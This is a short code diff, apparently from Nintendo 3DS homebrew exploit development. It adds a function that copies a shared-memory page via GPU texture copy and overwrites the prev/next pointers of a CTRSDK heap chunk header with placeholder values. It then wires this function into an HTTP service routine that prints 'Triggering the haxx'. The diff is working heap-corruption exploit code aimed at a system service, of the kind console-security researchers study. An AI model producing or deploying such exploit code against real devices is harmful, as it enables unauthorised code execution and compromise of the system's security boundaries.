@@ -85,6 +85,44 @@ Result locate_sharedmem_linearaddr(u32 **linearaddr)
 	return 0;
 }
 
+Result writehax_sharedmem_physmem(u32 *linearaddr)
+{
+	u32 chunksize = 0x1000;
+	u8 *tmpbuf;
+	u32 *tmpbuf32;
+
+	//Allocate memory for the sharedmem page, then copy the sharedmem physmem data into the buf.
+
+	tmpbuf = linearAlloc(chunksize);
+	if(tmpbuf==NULL)
+	{
+		printf("Failed to allocate mem for tmpbuf.\n");
+		return -1;
+	}
+
+	tmpbuf32 = (u32*)tmpbuf;
+
+	memset(tmpbuf, 0, chunksize);
+	GSPGPU_FlushDataCache(tmpbuf, chunksize);
+
+	GX_TextureCopy(linearaddr, 0, (u32*)tmpbuf, 0, chunksize, 0x8);
+	gspWaitForPPF();
+
+	//Overwrite the prev/next memchunk ptrs in the CTRSDK freemem memchunkhdr following the allocated struct for the POST data.
+	tmpbuf32[0x44>>2] = 0x40404040;
+	tmpbuf32[0x48>>2] = 0x50505050;
+
+	//Flush dcache for the modified sharedmem, then copy the data back into the sharedmem physmem.
+	GSPGPU_FlushDataCache(tmpbuf, chunksize);
+
+	GX_TextureCopy((u32*)tmpbuf, 0, linearaddr, 0, chunksize, 0x8);
+	gspWaitForPPF();
+
+	linearFree(tmpbuf);
+
+	return 0;
+}
+
 Result http_haxx(char *requrl)
 {
 	Result ret=0;
@@ -113,6 +151,16 @@ Result http_haxx(char *requrl)
 
 	printf("Successfully located the linearaddr for sharedmem: 0x%08x.\n", (unsigned int)linearaddr);
 
+	printf("Writing the haxx to physmem...\n");
+	ret = writehax_sharedmem_physmem(linearaddr);
+	if(ret!=0)
+	{
+		printf("Failed to setup the haxx.\n");
+		httpcCloseContext(&context);
+		return ret;
+	}
+
+	printf("Triggering the haxx...\n");
 	httpcCloseContext(&context);
 
 	return 0;
